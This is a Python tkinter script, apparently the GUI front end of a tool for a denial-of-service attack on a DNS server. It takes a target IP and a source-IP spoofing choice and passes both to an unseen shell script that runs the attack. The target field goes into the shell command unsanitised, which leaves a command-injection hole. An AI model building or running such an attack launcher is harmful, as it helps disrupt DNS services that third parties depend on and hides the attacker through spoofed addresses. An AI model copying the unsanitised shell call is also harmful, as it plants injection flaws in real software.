
from tkinter import *
from subprocess import Popen


window = Tk()
window.title("Attack Tool")
window.geometry("500x500") 
window.resizable(0, 0)
bg_clr = 'light slate gray'
window.configure(background=bg_clr)


lbl = Label(window, text="---DoS attack on DNS Server---", font=("Aldrich", 16), fg="navy", bg=bg_clr)
#lbl.grid(column=0, row=0)
lbl.place(relx=0.5, rely=0.1, anchor=CENTER)


lbl_ip = Label(window, text="IP Address of DNS Server:", font=("Aldrich", 10), fg="maroon", bg=bg_clr)
#lbl.grid(column=0, row=0)
lbl_ip.pack()
lbl_ip.place(relx=0.3, rely=0.3, anchor=CENTER)



ip_add = Entry(window,width=18, font=("Aldrich", 10), justify='center')
ip_add.pack()
ip_add.place(relx=0.70, rely=0.3, anchor=CENTER)
ip_add.focus()


ip_opt = IntVar()
ip_opt.set(1)

lbl_spoof = Label(window, text="Source IP Spoofing with: ", font=("Aldrich", 10), fg="maroon", bg=bg_clr)
rad1 = Radiobutton(window,text='Random IP', font=("Aldrich", 10), fg="medium blue", bg=bg_clr, value=1, variable=ip_opt)
rad2 = Radiobutton(window,text='IP from File', font=("Aldrich", 10), fg="medium blue", value=2, bg=bg_clr, variable=ip_opt)

lbl_spoof.pack()
rad1.pack()
rad2.pack()

lbl_spoof.place(relx=0.25, rely=0.5, anchor=CENTER)
rad1.place(relx=0.55, rely=0.5, anchor=CENTER)
rad2.place(relx=0.8, rely=0.5, anchor=CENTER)

def atk_clicked():
	res = "Attack initiated on\n" + ip_add.get() + "\nsuccessfully..." 
	Process=Popen('./exec_forGUI.sh %s %s' % (str(ip_add.get()),str(ip_opt.get()),), shell=True)
	lbl_ip.destroy()
	ip_add.destroy()
	lbl_spoof.destroy()
	rad1.destroy()
	rad2.destroy()
	atk_btn.destroy()
	lbl_2 = Label(window, text=res, font=("Aldrich", 20), fg="red", bg=bg_clr)
	#lbl.grid(column=0, row=0)
	lbl_2.place(relx=0.5, rely=0.5, anchor=CENTER)



	




atk_btn = Button(window, text="Initiate ATTACK", font=("Aldrich", 10), bg="red", fg="white", command=atk_clicked)
atk_btn.pack()
atk_btn.place(relx=0.5, rely=0.8, anchor=CENTER)

window.mainloop()
